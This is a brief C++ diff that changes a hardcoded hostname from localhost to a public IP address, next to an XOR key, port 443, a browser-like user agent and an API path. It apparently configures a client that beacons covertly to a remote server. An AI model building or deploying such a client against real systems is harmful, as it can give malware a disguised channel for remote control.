@@ -15,7 +15,7 @@
 
 
 const std::string XOR_KEY = "mysecretkey";
-const std::string hostname = "127.0.0.1";
+const std::string hostname = "217.154.13.193";
 const int port = 443;
 const std::string user_agent = "Mozilla/5.0";
 const std::string path_api = "/api";
